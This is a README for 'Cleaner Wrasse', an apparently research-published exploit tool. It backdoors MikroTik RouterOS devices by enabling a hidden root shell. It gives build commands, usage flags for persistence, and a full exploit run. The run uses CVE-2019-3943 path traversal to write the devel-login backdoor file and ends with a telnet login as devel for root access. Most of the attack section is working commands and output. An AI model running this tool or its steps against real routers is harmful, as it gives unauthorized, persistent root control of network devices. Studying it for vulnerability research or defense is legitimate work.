# Cleaner Wrasse

### Overview

* Cleaner Wrasse is a tool that remotely enables the hidden busybox shell in routers using RouterOS versions 3.x - 6.43.14. CW doesn't care about the router's architecture or any periphials. It should just work. Once enabled, the hidden shell allows the devel user to login with the admin's password over telnet or SSH. The user is then presented with a root shell. It's damn useful.

### Install and Configuration

```
sudo apt install cmake
sudo apt-get install libboost-all-dev

git clone https://github.com/tenable/routeros.git
cd routeros/
cd cleaner_wrasse/
mkdir build
cd ./build/
cmake ..
make
```

### Usage

```
./cleaner_wrasse 
options:
  -h [ --help ]             A list of command line options
  -v [ --version ]          Display version information
  -u [ --username ] arg     REQUIRED The user to log in as.
  -p [ --password ] arg     The password to log in with (if not provided CW 
                            uses an empty string).
  -i [ --ip ] arg           REQUIRED The IPv4 address to connect to.
  -s [ --symlink ] arg (=0) Add the survival symlink on the target if its 6.41+
  --persistence arg (=0)    Enable persistence on targets 6.41+

./cleaner_wrasse -v
Version: ><(((°> Cleaner Wrasse 1.0 - August 11, 2019 ><(((°>
```

### Exploit

```
./cleaner_wrasse -u admin -p mikrotikmikrotik -i 192.168.15.77 

            ><(((°>         ><(((°>         ><(((°> 
           ╔═╗┬  ┌─┐┌─┐┌┐┌┌─┐┬─┐  ╦ ╦┬─┐┌─┐┌─┐┌─┐┌─┐
           ║  │  ├┤ ├─┤│││├┤ ├┬┘  ║║║├┬┘├─┤└─┐└─┐├┤ 
           ╚═╝┴─┘└─┘┴ ┴┘└┘└─┘┴└─  ╚╩╝┴└─┴ ┴└─┘└─┘└─┘
                    <°)))><         <°)))><         

   "Cleaners are nothing but very clever behavioral parasites"

[+] Trying winbox on 192.168.15.77:8291
[+] Connected on 8291!
[+] Logging in as admin
[+] Login success!
[+] Sending a version request
[+] The device is running RouterOS 6.40.5 (stable)
[+] The backdoor location is /flash/nova/etc/devel-login
[+] We support 3 vulnerabilities for this version:
	1. CVE-2019-3943
	2. HackerFantastic Set Tracefile
	3. CVE-2018-14847
[?] Please select an vulnerability (1-3):1
[+] You've selected CVE-2019-3943. What a fine choice!
[+] Opening //./.././.././../flash/nova/etc/devel-login for writing.
[+] Done! The backdoor is active. ><(((°>

telnet -l devel 192.168.15.77
<admin-password>
```
